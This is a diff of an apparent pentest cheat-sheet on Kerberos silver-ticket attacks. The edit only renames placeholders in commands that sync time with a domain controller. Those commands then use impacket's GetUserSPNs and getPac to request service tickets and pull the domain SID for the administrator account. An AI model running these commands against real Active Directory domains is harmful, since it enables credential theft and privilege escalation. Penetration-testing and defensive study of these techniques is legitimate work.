@@ -13,12 +13,12 @@ tags: ["Pass-The-Ticket", "SID", "Rubeus", "Ticket Granting Ticket", "Silver Tic
 #### 1. Get service principle name (SPN) \[optional\]
 
 ```console
-sudo ntpdate -s <DC> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -request -k
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -request -k
 ```
 
 ```console
 # If NTLM auth is disabled
-sudo ntpdate -s <DC> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-host <DC> -request -k
+sudo ntpdate -s <DC_IP> && impacket-GetUserSPNs '<DOMAIN>/<USER>:<PASSWORD>' -dc-host <DC> -request -k
 ```
 
 #### 2. Generate NTLM
@@ -35,7 +35,7 @@ MD4(stdin)= 1443ec19da4dac4ffc953bca1b57b4cf
 #### 3. Get domain SID
 
 ```console
-sudo ntpdate -s <DC> && impacket-getPac -targetUser administrator '<DOMAIN>/<USER>:<PASSWORD>'
+sudo ntpdate -s <DC_IP> && impacket-getPac -targetUser administrator '<DOMAIN>/<USER>:<PASSWORD>'
 ```
 
 ```console {class="sample-code"}
